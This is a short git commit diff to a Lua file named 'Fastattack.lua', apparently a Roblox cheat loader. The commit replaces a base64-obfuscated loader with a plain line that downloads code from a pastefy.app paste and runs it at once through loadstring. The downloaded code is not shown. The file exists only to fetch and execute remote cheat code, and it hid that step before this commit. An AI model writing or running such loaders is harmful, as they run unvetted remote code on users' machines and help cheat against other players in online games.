faf4d375aacc59bbbfad5355a8a83d9aa43fde1b
Vuacuascript <tyygyyg778@gmail.com>
2026-01-07 20:38:07 +0700

    Fastattack.lua

--- Fastattack.lua
+++ Fastattack.lua
@@ -1,2 +1,1 @@
--- Obfuscated Lua
-loadstring(game:HttpGet('data:text/plain;base64,bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcGFzdGVmeS5hcHAvUUJCdGRiUnkvcmF3IiwgdHJ1ZSkpKCk='))()
+loadstring(game:HttpGet("https://pastefy.app/QBBtdbRy/raw", true))()
